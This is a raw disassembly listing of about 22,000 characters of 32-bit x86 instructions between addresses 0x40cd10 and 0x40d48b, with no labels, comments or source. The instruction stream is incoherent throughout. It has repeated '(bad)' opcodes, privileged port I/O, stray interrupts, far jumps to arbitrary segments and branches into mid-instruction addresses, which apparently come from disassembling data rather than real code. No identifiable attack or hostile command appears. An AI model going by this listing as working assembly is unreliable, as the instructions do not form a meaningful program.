  40cd10:	jnp    0x40cd39
  40cd12:	push   esp
  40cd13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd14:	or     cl,BYTE PTR [ebx-0xf99b7c7]
  40cd1a:	mov    bh,0xb0
  40cd1c:	push   esi
  40cd1d:	sbb    al,0x7b
  40cd1f:	shr    ch,cl
  40cd21:	xchg   esi,eax
  40cd22:	pop    eax
  40cd23:	in     al,0x6f
  40cd25:	xchg   esp,eax
  40cd26:	cld    
  40cd27:	lahf   
  40cd28:	pop    eax
  40cd29:	sbb    BYTE PTR [esi-0x64],bh
  40cd2c:	sub    BYTE PTR [esi],ah
  40cd2e:	pop    edi
  40cd2f:	xor    ebx,DWORD PTR [eax+0x2ec5b7b5]
  40cd35:	add    al,0xc6
  40cd37:	pop    edi
  40cd38:	shr    ah,0x0
  40cd3b:	shl    BYTE PTR [ecx+0x4103abfd],cl
  40cd41:	push   esi
  40cd42:	xchg   edi,eax
  40cd43:	fsubr  QWORD PTR [ecx-0x78]
  40cd46:	or     al,0x5f
  40cd48:	retf   
  40cd49:	cwde   
  40cd4a:	gs jecxz 0x40ccef
  40cd4d:	mov    ebx,0xe10c8e2e
  40cd52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd53:	jno    0x40cd0b
  40cd55:	inc    eax
  40cd56:	ss stos DWORD PTR es:[edi],eax
  40cd58:	jmp    FWORD PTR ds:[edi+0x46]
  40cd5c:	add    cl,ah
  40cd5e:	add    ebx,ecx
  40cd60:	mov    ds:0x2bd5f076,eax
  40cd65:	adc    BYTE PTR [esi-0x1],0x67
  40cd69:	push   0xffffff9c
  40cd6b:	clc    
  40cd6c:	cmp    ebx,DWORD PTR ss:[eax-0x69]
  40cd70:	das    
  40cd71:	in     al,0xd5
  40cd73:	adc    ebx,DWORD PTR [ecx]
  40cd75:	ins    DWORD PTR es:[edi],dx
  40cd76:	iret   
  40cd77:	sahf   
  40cd78:	retf   
  40cd79:	call   0x5cba:0x8f89bbbc
  40cd80:	(bad)  
  40cd81:	pop    esp
  40cd82:	scas   eax,DWORD PTR es:[edi]
  40cd83:	xchg   esi,eax
  40cd84:	push   ss
  40cd85:	shl    DWORD PTR [eax+0x5904874d],cl
  40cd8b:	add    eax,0xc0e95717
  40cd90:	repnz xor BYTE PTR [edi],ah
  40cd93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd94:	mov    ds:0x9a4cd508,eax
  40cd99:	sbb    eax,0x2f2d9afb
  40cd9e:	jne    0x40cdb5
  40cda0:	or     al,0x2e
  40cda2:	pop    ebp
  40cda3:	leave  
  40cda4:	xor    ebp,0x47
  40cda7:	repz arpl ax,si
  40cdaa:	loop   0x40ce28
  40cdac:	push   ss
  40cdad:	std    
  40cdae:	jge    0x40cd5d
  40cdb0:	jbe    0x40cd6e
  40cdb2:	(bad)
  40cdb5:	adc    edx,edx
  40cdb7:	test   eax,edi
  40cdb9:	daa    
  40cdba:	dec    edi
  40cdbb:	inc    esi
  40cdbc:	jecxz  0x40cd44
  40cdbe:	mov    ds:0x2e2eb883,eax
  40cdc3:	sbb    ebx,DWORD PTR [esi-0x5043880d]
  40cdc9:	data16 std 
  40cdcb:	int    0x8
  40cdcd:	js     0x40cde7
  40cdcf:	xor    ch,cl
  40cdd1:	out    0x40,eax
  40cdd3:	pusha  
  40cdd4:	jo     0x40cde7
  40cdd6:	repz sbb al,0xc
  40cdd9:	cmp    edi,DWORD PTR [eax-0x7c]
  40cddc:	es pop eax
  40cdde:	dec    edx
  40cddf:	jecxz  0x40ce4a
  40cde1:	sti    
  40cde2:	fs jmp 0x1806cff8
  40cde8:	imul   DWORD PTR [esi]
  40cdea:	pusha  
  40cdeb:	repnz loop 0x40ce45
  40cdee:	add    eax,0x776bcd63
  40cdf3:	jmp    0x9c36c87d
  40cdf8:	ret    0xa53d
  40cdfb:	es and ecx,edx
  40cdfe:	sti    
  40cdff:	dec    DWORD PTR [ebp-0x1b82fc0a]
  40ce05:	(bad)  
  40ce06:	pop    esi
  40ce07:	mov    esp,0x10b91332
  40ce0c:	outs   dx,BYTE PTR ds:[esi]
  40ce0d:	jb     0x40cdb9
  40ce0f:	fdiv   QWORD PTR [esi]
  40ce11:	(bad)  
  40ce12:	enter  0xf2ee,0x5f
  40ce16:	loope  0x40ce0c
  40ce18:	popa   
  40ce19:	mov    edx,0xae4fdec9
  40ce1e:	clc    
  40ce1f:	(bad)  
  40ce20:	jo     0x40cdcc
  40ce22:	lahf   
  40ce23:	adc    eax,0x86da9ee2
  40ce28:	imul   esp,ebp,0x137093ea
  40ce2e:	pusha  
  40ce2f:	push   edi
  40ce30:	mov    edx,0xdafeaeba
  40ce35:	xor    ah,bl
  40ce37:	sti    
  40ce38:	jle    0x40cdfe
  40ce3a:	dec    esi
  40ce3b:	inc    eax
  40ce3c:	(bad)  [edx+0x624d39dc]
  40ce42:	xchg   esp,eax
  40ce43:	push   esi
  40ce44:	mov    eax,0xae27467e
  40ce49:	loopne 0x40cddc
  40ce4b:	xor    DWORD PTR [ecx],0xcb87d92b
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	sub    al,0x59
  40ce64:	push   eax
  40ce65:	(bad)  
  40ce66:	sub    al,0x8b
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	lods   eax,DWORD PTR ds:[esi]
  40ce6f:	and    al,0x2c
  40ce71:	pop    ds
  40ce72:	mov    cl,0x34
  40ce74:	xor    ch,ch
  40ce76:	and    dl,BYTE PTR [esi-0x6aaf101b]
  40ce7c:	adc    BYTE PTR [ebx+0x4643250a],0xe0
  40ce83:	mov    ds:0x3f0764f7,al
  40ce88:	adc    al,0xdc
  40ce8a:	popf   
  40ce8b:	sub    bl,cl
  40ce8d:	jne    0x40ce9e
  40ce8f:	outs   dx,BYTE PTR ds:[esi]
  40ce90:	mov    ebx,0xf778851c
  40ce95:	sub    ch,BYTE PTR [edi+0x73]
  40ce98:	aam    0xf8
  40ce9a:	jae    0x40ce71
  40ce9c:	pop    esi
  40ce9d:	daa    
  40ce9e:	sub    dh,BYTE PTR [esi-0x68c2513a]
  40cea4:	ins    BYTE PTR es:[edi],dx
  40cea5:	pop    ebp
  40cea6:	int    0x4e
  40cea8:	and    ebx,esi
  40ceaa:	das    
  40ceab:	inc    ebp
  40ceac:	push   ss
  40cead:	ror    BYTE PTR ds:0xa9b9c78a,cl
  40ceb3:	sbb    al,0xb6
  40ceb5:	cld    
  40ceb6:	bound  esp,QWORD PTR [edx]
  40ceb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceb9:	daa    
  40ceba:	or     bh,BYTE PTR [ebx-0x3c9118cc]
  40cec0:	cmp    eax,0xd202b5e1
  40cec5:	lea    edi,[eax-0x39003786]
  40cecb:	xchg   DWORD PTR [esi],ebp
  40cecd:	pop    ss
  40cece:	mov    al,0x35
  40ced0:	add    BYTE PTR [ecx-0x47],dl
  40ced3:	push   esi
  40ced4:	xor    edi,DWORD PTR [ebp+0x46e070e2]
  40ceda:	je     0x40ce7b
  40cedc:	add    ebp,ebx
  40cede:	addr16 (bad) 
  40cee0:	mov    al,0xbd
  40cee2:	add    BYTE PTR [edx-0xe1975af],dh
  40cee8:	jmp    0x45f77deb
  40ceed:	jnp    0x40cf14
  40ceef:	rcl    BYTE PTR [edx+0x51c5f3ea],1
  40cef5:	mov    ah,0x36
  40cef7:	es xchg esp,eax
  40cef9:	push   ebx
  40cefa:	mov    ch,0xef
  40cefc:	mov    dl,al
  40cefe:	fistp  DWORD PTR [edx]
  40cf00:	dec    ecx
  40cf01:	and    eax,0xfb398144
  40cf06:	sbb    DWORD PTR [esi+eax*2+0x56],ecx
  40cf0a:	cli    
  40cf0b:	aad    0x8e
  40cf0d:	add    bh,BYTE PTR [eax+0x5bdfa8fe]
  40cf13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf14:	push   esi
  40cf15:	or     eax,0x35fd7629
  40cf1a:	fs mov ch,0xfd
  40cf1d:	mov    esp,0x3be814a
  40cf22:	rep stos BYTE PTR es:[edi],al
  40cf24:	jbe    0x40cf0a
  40cf26:	in     al,0x70
  40cf28:	es dec edi
  40cf2a:	je     0x40cf5c
  40cf2c:	inc    ecx
  40cf2d:	push   0x1a
  40cf2f:	dec    ebp
  40cf30:	sub    DWORD PTR [ebx+edx*1-0x3d],ecx
  40cf34:	pusha  
  40cf35:	idiv   DWORD PTR [edi]
  40cf37:	dec    edx
  40cf38:	sub    esp,DWORD PTR [ebx-0x42740fc2]
  40cf3e:	jecxz  0x40cf6e
  40cf40:	gs cdq 
  40cf42:	shl    ebp,cl
  40cf44:	arpl   bx,cx
  40cf46:	inc    esp
  40cf47:	stc    
  40cf48:	ss sbb dl,al
  40cf4b:	(bad)  
  40cf4c:	je     0x40ced3
  40cf4e:	xor    DWORD PTR [eax+0x61f4e26c],0xffffffda
  40cf55:	cmp    eax,0xa978c26e
  40cf5a:	pushf  
  40cf5b:	hlt    
  40cf5c:	data16 sub BYTE PTR [esi-0x6a380adc],dh
  40cf63:	mov    esp,0x8a8bd3b2
  40cf68:	xor    edi,edi
  40cf6a:	jg     0x40cf23
  40cf6c:	or     al,0x4e
  40cf6e:	xchg   edx,eax
  40cf6f:	data16 mov bl,0x31
  40cf72:	iret   
  40cf73:	push   edx
  40cf74:	xchg   esp,eax
  40cf75:	mov    esp,0x888d6141
  40cf7a:	rcr    BYTE PTR [bx+di-0x1f],cl
  40cf7e:	or     cl,BYTE PTR [esi-0x3f18ade1]
  40cf84:	es push 0xc9247ea3
  40cf8a:	mov    eax,0x7570a0d4
  40cf8f:	iret   
  40cf90:	pop    edx
  40cf91:	repnz les ecx,FWORD PTR [ebx]
  40cf94:	neg    DWORD PTR [edx-0x6f]
  40cf97:	ins    DWORD PTR es:[edi],dx
  40cf98:	xchg   esp,eax
  40cf99:	or     edx,DWORD PTR [edi+0x5c]
  40cf9c:	xlat   BYTE PTR ds:[ebx]
  40cf9d:	jo     0x40cfb4
  40cf9f:	xor    ch,BYTE PTR ds:0x6de5c85f
  40cfa5:	adc    al,0xf5
  40cfa7:	sub    al,0x1
  40cfa9:	mov    ds:0x2d11e891,al
  40cfae:	push   esp
  40cfaf:	lock out dx,al
  40cfb1:	xchg   DWORD PTR [esp+edi*4],ebx
  40cfb4:	mov    cl,0x6b
  40cfb6:	jnp    0x40d00c
  40cfb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfb9:	(bad)  
  40cfba:	lods   al,BYTE PTR ds:[esi]
  40cfbb:	imul   eax,eax,0x66
  40cfbe:	ds jnp 0x40cf4a
  40cfc1:	adc    BYTE PTR [ecx-0x3cc361c9],bh
  40cfc7:	cwde   
  40cfc8:	(bad)  
  40cfc9:	(bad)  
  40cfca:	mov    esp,DWORD PTR [edi+0x13233940]
  40cfd0:	test   eax,0xf789d1dc
  40cfd5:	loop   0x40cfa3
  40cfd7:	jl     0x40cfe2
  40cfd9:	dec    esp
  40cfda:	add    eax,0xf32a73eb
  40cfdf:	repz dec esp
  40cfe1:	adc    edx,DWORD PTR [esi+0x6715b72f]
  40cfe7:	add    DWORD PTR [edx+edi*4],edx
  40cfea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfeb:	dec    esi
  40cfec:	repnz pop edx
  40cfee:	dec    esp
  40cfef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cff0:	neg    BYTE PTR [eax-0x168dd9e1]
  40cff6:	aad    0x8c
  40cff8:	push   edi
  40cff9:	call   0x76274699
  40cffe:	adc    BYTE PTR [edi-0x6d],bl
  40d001:	mov    dl,0xdb
  40d003:	in     al,0x23
  40d005:	xor    DWORD PTR [edi-0x37085e51],edi
  40d00b:	adc    eax,0x64e8a5ee
  40d010:	xor    al,0xfe
  40d012:	test   al,0x70
  40d014:	sub    cl,BYTE PTR [esi-0x55]
  40d017:	mov    esp,0x2ac430fc
  40d01c:	inc    edx
  40d01d:	mov    ah,0xcc
  40d01f:	cmp    bl,ch
  40d021:	nop
  40d022:	(bad)  
  40d024:	xor    eax,0xa89efae1
  40d029:	mov    eax,ds:0xead5e65f
  40d02e:	sbb    BYTE PTR [ebx-0xd012056],dl
  40d034:	xor    BYTE PTR [eax+0x15cf864],al
  40d03a:	push   eax
  40d03b:	ds stos BYTE PTR es:[edi],al
  40d03d:	lock ins DWORD PTR es:[edi],dx
  40d03f:	repz xchg ecx,eax
  40d041:	mov    ch,0x74
  40d043:	mov    al,ds:0xfb35d0f9
  40d048:	adc    ah,BYTE PTR [ebp+0x4a]
  40d04b:	push   0xffffffc3
  40d04d:	add    DWORD PTR [ecx-0x55],ebx
  40d050:	rcr    bh,1
  40d052:	and    eax,0xcd5fa09
  40d057:	push   esi
  40d058:	cmp    BYTE PTR [esi-0x10],0xc4
  40d05c:	push   esi
  40d05d:	mov    BYTE PTR [edx-0x72],0x31
  40d061:	xchg   ecx,eax
  40d062:	ret    
  40d063:	mov    al,0xb9
  40d065:	mov    eax,ds:0xd2402398
  40d06a:	(bad)  
  40d06b:	repnz cs das 
  40d06e:	rcl    BYTE PTR [ecx+0x3e4b5e89],0xdd
  40d075:	leave  
  40d076:	into   
  40d077:	lock push esp
  40d079:	xlat   BYTE PTR ds:[ebx]
  40d07a:	dec    eax
  40d07b:	test   al,0xf
  40d07d:	dec    ecx
  40d07e:	ins    BYTE PTR es:[edi],dx
  40d07f:	cs cmp cl,ch
  40d082:	inc    ecx
  40d083:	and    BYTE PTR [ecx-0x34e3401f],bl
  40d089:	out    0xe3,eax
  40d08b:	inc    edx
  40d08c:	cmc    
  40d08d:	fsub   st,st(3)
  40d08f:	es xchg edi,eax
  40d091:	in     al,0x92
  40d093:	sbb    DWORD PTR [edx],ebx
  40d095:	adc    eax,0xb727f291
  40d09a:	loop   0x40d02a
  40d09c:	cmc    
  40d09d:	cld    
  40d09e:	hlt    
  40d09f:	xor    eax,0x515f52c6
  40d0a4:	sti    
  40d0a5:	mov    bh,0xd
  40d0a7:	jle    0x40d090
  40d0a9:	in     eax,dx
  40d0aa:	and    ebp,DWORD PTR [ebp+0x4b]
  40d0ad:	retf   
  40d0ae:	add    ch,BYTE PTR [edi]
  40d0b0:	es dec ax
  40d0b3:	dec    cx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	add    BYTE PTR [ecx+0x2d],al
  40d0d2:	pop    es
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d0ff
  40d0dc:	repnz push ds
  40d0de:	pop    ebp
  40d0df:	xor    DWORD PTR [ecx+0x48143294],ebx
  40d0e5:	mov    WORD PTR [esi+0x50],cs
  40d0e8:	in     al,0x3a
  40d0ea:	shl    DWORD PTR [edi-0x6d],1
  40d0ed:	push   ebp
  40d0ee:	or     edi,DWORD PTR [esi+ebx*4-0x4f]
  40d0f2:	mov    ds:0x5f48bd3b,eax
  40d0f7:	push   ecx
  40d0f8:	rcr    DWORD PTR [ebx],1
  40d0fa:	pop    edi
  40d0fb:	popf   
  40d0fc:	hlt    
  40d0fd:	int    0x21
  40d0ff:	scas   al,BYTE PTR es:[edi]
  40d100:	lock icebp 
  40d102:	stos   DWORD PTR es:[edi],eax
  40d103:	mov    ds:0x151458f6,al
  40d108:	xlat   BYTE PTR ds:[ebx]
  40d109:	sar    edx,1
  40d10b:	repz xor DWORD PTR [esi],ebx
  40d10e:	cwde   
  40d10f:	cmp    cl,BYTE PTR [edx-0x3b]
  40d112:	mov    ds:0xe989dd81,al
  40d117:	sbb    al,0x75
  40d119:	mov    ebp,0xb25dd8e3
  40d11e:	in     al,0xb9
  40d120:	bound  ecx,QWORD PTR [ecx-0xd8eb40c]
  40d126:	cmp    ebx,DWORD PTR [edi+0x59]
  40d129:	aas    
  40d12a:	leave  
  40d12b:	cdq    
  40d12c:	or     bh,BYTE PTR [esi-0x4a]
  40d12f:	bound  ecx,QWORD PTR [ecx]
  40d131:	out    dx,eax
  40d132:	sub    dl,BYTE PTR [eax]
  40d134:	and    eax,0x9d4086ed
  40d139:	mov    eax,ds:0x1ae889c0
  40d13e:	loopne 0x40d0f0
  40d140:	imul   DWORD PTR [edx+0x5964b886]
  40d146:	and    al,0x59
  40d148:	push   ds
  40d149:	call   0xd7989124
  40d14e:	sbb    al,0x33
  40d150:	pusha  
  40d151:	fsub   QWORD PTR [esi-0x4503f38c]
  40d157:	cld    
  40d158:	in     al,dx
  40d159:	out    0x6d,eax
  40d15b:	xchg   ecx,eax
  40d15c:	or     eax,0x641535a4
  40d161:	vpsubq xmm3,xmm0,xmm1
  40d165:	mov    esi,ss
  40d167:	out    0xe,eax
  40d169:	mov    DWORD PTR [eax],edi
  40d16b:	inc    eax
  40d16c:	cli    
  40d16d:	push   ss
  40d16e:	das    
  40d16f:	sbb    BYTE PTR [ecx+0x17cda5fe],cl
  40d175:	icebp  
  40d176:	mov    DWORD PTR [eax-0x5572f2ee],esp
  40d17c:	mov    ds:0x531c4136,al
  40d181:	scas   eax,DWORD PTR es:[edi]
  40d182:	mov    BYTE PTR [esi],ah
  40d184:	call   DWORD PTR [esi+0x16c4073]
  40d18a:	dec    ebp
  40d18b:	and    edx,eax
  40d18d:	arpl   WORD PTR [esi-0x40288bf3],si
  40d193:	js     0x40d1eb
  40d195:	ret    
  40d196:	int3   
  40d197:	fwait
  40d198:	adc    dl,BYTE PTR [ecx+0x1]
  40d19b:	xchg   BYTE PTR [ebp+0x2a],ch
  40d19e:	jnp    0x40d1a5
  40d1a0:	imul   esp,eax,0x3514b901
  40d1a6:	xor    ecx,DWORD PTR [ecx]
  40d1a8:	dec    ebx
  40d1a9:	shr    ah,0x40
  40d1ac:	mov    DWORD PTR [esi],ebp
  40d1ae:	adc    DWORD PTR [ebx-0x2e],edx
  40d1b1:	xor    al,0x52
  40d1b3:	js     0x40d22f
  40d1b5:	push   0x389a2118
  40d1ba:	stc    
  40d1bb:	test   al,0xea
  40d1bd:	int3   
  40d1be:	inc    eax
  40d1bf:	xchg   edx,eax
  40d1c0:	pushf  
  40d1c1:	sub    BYTE PTR [edi+0x3a],ah
  40d1c4:	push   eax
  40d1c5:	fiadd  DWORD PTR [esi+ebx*1-0x12b6aaab]
  40d1cc:	xor    eax,DWORD PTR [ebx]
  40d1ce:	push   ebx
  40d1cf:	aam    0xfc
  40d1d1:	xor    al,0xd4
  40d1d3:	loop   0x40d22c
  40d1d5:	test   BYTE PTR [edx-0x48eaee54],dl
  40d1db:	push   cs
  40d1dc:	retf   0xcc6e
  40d1df:	daa    
  40d1e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1e1:	jmp    0xe1fd:0xa5e85180
  40d1e8:	adc    BYTE PTR ds:0x5192eac1,0x1b
  40d1ef:	dec    ebp
  40d1f0:	mov    ecx,0x30e60b1c
  40d1f5:	inc    edi
  40d1f6:	jmp    0x40d1d1
  40d1f8:	(bad)  
  40d1f9:	dec    esi
  40d1fa:	(bad)  
  40d1fb:	lods   eax,DWORD PTR ds:[esi]
  40d1fc:	cmp    esp,eax
  40d1fe:	push   0xffffff95
  40d200:	push   ebp
  40d201:	ss mov dl,0xae
  40d204:	push   0x6f
  40d206:	sar    BYTE PTR [ebp+0x65],0x7
  40d20a:	shl    DWORD PTR [esi],1
  40d20c:	jbe    0x40d221
  40d20e:	xor    al,0xfa
  40d210:	shl    BYTE PTR [edx],1
  40d212:	popa   
  40d213:	or     eax,0xc62406dd
  40d218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d219:	and    BYTE PTR [esi-0x1076f3b8],ch
  40d21f:	jmp    0x8461b2cc
  40d224:	push   ebp
  40d225:	ds mov eax,ecx
  40d228:	ror    DWORD PTR [edx+0x71f59c0e],cl
  40d22e:	or     BYTE PTR [edx+0x22],dh
  40d231:	les    ecx,FWORD PTR [edi-0x139cb1ff]
  40d237:	push   ecx
  40d238:	fild   DWORD PTR [ebp+0x3609831a]
  40d23e:	add    BYTE PTR [eax+0x2],bl
  40d241:	pop    eax
  40d242:	sub    ebx,ecx
  40d244:	and    BYTE PTR [bx+di+0x31],dh
  40d248:	fdiv   DWORD PTR [edi]
  40d24a:	inc    ebp
  40d24b:	adc    bl,BYTE PTR [eax+0x71]
  40d24e:	mov    ah,0xc1
  40d250:	mov    bh,0x7c
  40d252:	push   ds
  40d253:	cli    
  40d254:	in     al,0x45
  40d256:	imul   esi,DWORD PTR [ebp-0x41],0xe47eb139
  40d25d:	mov    ecx,0xf51da45
  40d262:	jecxz  0x40d2a3
  40d264:	sbb    eax,0x2373a0fc
  40d269:	inc    ebp
  40d26a:	pushf  
  40d26b:	retf   0x1306
  40d26e:	jge    0x40d246
  40d270:	sbb    DWORD PTR [eax],esp
  40d272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d273:	mov    esi,0x8efa5ba2
  40d278:	test   al,0x6d
  40d27a:	enter  0xa8a3,0xed
  40d27e:	push   0x57
  40d280:	push   0x4e
  40d282:	ja     0x40d251
  40d284:	outs   dx,BYTE PTR ds:[esi]
  40d285:	inc    esp
  40d286:	ins    DWORD PTR es:[edi],dx
  40d287:	cmp    DWORD PTR [eax-0xc],edx
  40d28a:	mov    ah,0xa2
  40d28c:	inc    ebp
  40d28d:	pushf  
  40d28e:	sbb    dl,BYTE PTR [edi+0x33342afe]
  40d294:	sbb    ebp,ecx
  40d296:	iret   
  40d297:	mov    bh,0x7a
  40d299:	in     al,dx
  40d29a:	jl     0x40d244
  40d29c:	fsub   QWORD PTR [eax+0x5e6b003]
  40d2a2:	add    BYTE PTR [edi-0x3ed0a11b],bh
  40d2a8:	in     eax,dx
  40d2a9:	mov    cl,0x76
  40d2ab:	mov    al,ds:0xeeddceff
  40d2b0:	mov    dl,0xf5
  40d2b2:	dec    eax
  40d2b3:	jl     0x40d26b
  40d2b5:	and    cl,0x46
  40d2b8:	dec    esi
  40d2b9:	test   BYTE PTR [esi],al
  40d2bb:	stos   BYTE PTR es:[edi],al
  40d2bc:	leave  
  40d2bd:	imul   ecx,DWORD PTR [ebp+ebp*4-0x2adac799],0x4a
  40d2c5:	push   eax
  40d2c6:	add    DWORD PTR [edx-0x2e982cb9],ebx
  40d2cc:	add    al,0x27
  40d2ce:	nop
  40d2cf:	mov    dl,BYTE PTR [edi+eiz*2+0x52]
  40d2d3:	pop    ss
  40d2d4:	cmove  edi,DWORD PTR [ebp-0x3d8ba92d]
  40d2db:	mov    al,ds:0x93414e70
  40d2e0:	mov    eax,0x1bc6d55d
  40d2e5:	in     al,dx
  40d2e6:	test   BYTE PTR [edi],dl
  40d2e8:	add    eax,0x26855e54
  40d2ed:	pop    edx
  40d2ee:	pop    eax
  40d2ef:	dec    eax
  40d2f0:	jmp    0x40d279
  40d2f2:	fist   DWORD PTR [ebx-0x4c]
  40d2f5:	jnp    0x40d339
  40d2f7:	inc    edx
  40d2f8:	and    dh,BYTE PTR [edx]
  40d2fa:	lods   al,BYTE PTR ds:[esi]
  40d2fb:	ins    BYTE PTR es:[edi],dx
  40d2fc:	mov    dl,0xd8
  40d2fe:	jne    0x40d2ee
  40d300:	push   esi
  40d301:	mov    ebp,0x82897d9b
  40d306:	cli    
  40d307:	xchg   esp,eax
  40d308:	enter  0xd5a3,0xd7
  40d30c:	fwait
  40d30d:	sbb    eax,0xdfdd0570
  40d312:	jmp    0x9ae:0xea6301b0
  40d319:	dec    ecx
  40d31a:	xlat   BYTE PTR ds:[ebx]
  40d31b:	scas   eax,DWORD PTR es:[edi]
  40d31c:	stc    
  40d31d:	inc    ebx
  40d31e:	jmp    0x8bdb:0x3350e9da
  40d325:	aam    0x4a
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	mov    ch,0x69
  40d33a:	retf   
  40d33b:	(bad)  
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	push   es
  40d345:	das    
  40d346:	out    0x44,eax
  40d348:	mov    WORD PTR [ebx+0x697bf3c2],cs
  40d34e:	dec    dl
  40d350:	cmp    eax,0x89bf4f37
  40d355:	xchg   DWORD PTR [esi-0x15e127f4],eax
  40d35b:	das    
  40d35c:	leave  
  40d35d:	jnp    0x40d366
  40d35f:	ret    0x6129
  40d362:	mov    eax,0x8225e5a7
  40d367:	mov    BYTE PTR [edx+eax*4+0x1e],cl
  40d36b:	aam    0xdf
  40d36d:	imul   ebp,ebp,0xa54e9d68
  40d373:	jnp    0x40d3d9
  40d375:	out    0x75,al
  40d377:	out    0xf,al
  40d379:	push   es
  40d37a:	cmp    edx,esi
  40d37c:	inc    edx
  40d37d:	imul   esp,DWORD PTR [ebp-0x43],0xffffffe5
  40d381:	(bad)  
  40d382:	je     0x40d312
  40d384:	call   DWORD PTR [ebp+0x71]
  40d387:	push   ebp
  40d388:	fs add ax,0x1c76
  40d38d:	cdq    
  40d38e:	test   BYTE PTR [edi-0x16c4b657],cl
  40d394:	(bad)  
  40d396:	into   
  40d397:	loopne 0x40d387
  40d399:	jecxz  0x40d323
  40d39b:	cld    
  40d39c:	loop   0x40d3c0
  40d39e:	push   ss
  40d39f:	jo     0x40d401
  40d3a1:	dec    eax
  40d3a2:	imul   eax,esi,0xfffffff7
  40d3a5:	mov    ds:0xd3b03929,eax
  40d3aa:	push   es
  40d3ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3ac:	and    ah,BYTE PTR [edi+0x360c02bd]
  40d3b2:	fcmovbe st,st(5)
  40d3b4:	test   BYTE PTR [esi],cl
  40d3b6:	or     cl,bh
  40d3b8:	sub    bh,dl
  40d3ba:	fsubr  st,st(5)
  40d3bc:	std    
  40d3bd:	ins    DWORD PTR es:[edi],dx
  40d3be:	pop    ebp
  40d3bf:	fld    QWORD PTR [esi+0x4143d4b9]
  40d3c5:	(bad)  [edi+0x70]
  40d3c8:	(bad)  
  40d3c9:	clc    
  40d3ca:	fimul  DWORD PTR ds:0xddd123fc
  40d3d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3d1:	(bad)  [eax]
  40d3d3:	push   ebp
  40d3d4:	mov    esi,0x152eec65
  40d3d9:	mov    dh,BYTE PTR [esi+0x584a99ad]
  40d3df:	out    dx,eax
  40d3e0:	nop
  40d3e1:	jl     0x40d376
  40d3e3:	inc    ebx
  40d3e4:	adc    edx,ebx
  40d3e6:	pop    esi
  40d3e7:	cmp    eax,0xc3d6d58e
  40d3ec:	sar    BYTE PTR [edi+eiz*2-0x1f3780a3],0x39
  40d3f4:	fmulp  st(5),st
  40d3f6:	and    eax,0xec0d3554
  40d3fb:	mov    dh,0x77
  40d3fd:	out    0x7b,al
  40d3ff:	pop    ebp
  40d400:	cld    
  40d401:	fld    st(2)
  40d403:	dec    esp
  40d404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d405:	push   ecx
  40d406:	add    eax,0x478fd0e1
  40d40b:	dec    ebp
  40d40c:	jb     0x40d3ea
  40d40e:	xchg   edx,eax
  40d40f:	pusha  
  40d410:	sar    ebx,1
  40d412:	cs scas eax,DWORD PTR es:[edi]
  40d414:	aaa    
  40d415:	jmp    0x40d419
  40d417:	pop    ecx
  40d418:	xor    BYTE PTR [edx],dl
  40d41a:	test   eax,0x642265c
  40d41f:	adc    ah,ch
  40d421:	jb     0x40d3c6
  40d423:	retf   
  40d424:	test   BYTE PTR [ecx],ch
  40d426:	add    eax,0x90c8cfd3
  40d42b:	gs popf 
  40d42d:	sbb    eax,0xe9309769
  40d432:	inc    edi
  40d433:	scas   al,BYTE PTR es:[edi]
  40d434:	ins    BYTE PTR es:[edi],dx
  40d435:	inc    edx
  40d436:	inc    esi
  40d437:	push   ebp
  40d438:	scas   eax,DWORD PTR es:[edi]
  40d439:	push   ecx
  40d43b:	push   0x44962f6e
  40d440:	mov    esp,0xb538ba8
  40d445:	iret   
  40d446:	stos   DWORD PTR es:[edi],eax
  40d447:	dec    edx
  40d448:	pop    esp
  40d449:	test   al,0x30
  40d44b:	mov    ds:0x51bc8542,eax
  40d450:	push   ss
  40d451:	xor    edx,DWORD PTR [ecx-0x69b46411]
  40d457:	jecxz  0x40d4ca
  40d459:	out    dx,al
  40d45a:	add    eax,0xbaa9444d
  40d45f:	arpl   WORD PTR [ebx+ecx*1],di
  40d462:	cmp    bh,dh
  40d464:	out    0xef,eax
  40d466:	mov    ds:0x3bda6228,al
  40d46b:	or     ah,ch
  40d46d:	outs   dx,DWORD PTR ds:[si]
  40d46f:	mov    esi,DWORD PTR [di+0x5b]
  40d473:	push   ebp
  40d474:	sti    
  40d475:	pop    esp
  40d476:	int3   
  40d477:	lea    ebx,[ecx+0x57ed15bc]
  40d47d:	inc    ecx
  40d47e:	mov    ds:0x78b9719d,eax
  40d483:	in     al,dx
  40d484:	mov    ds:0x6acaffca,al
  40d489:	sub    dl,dl
  40d48b:	sti    
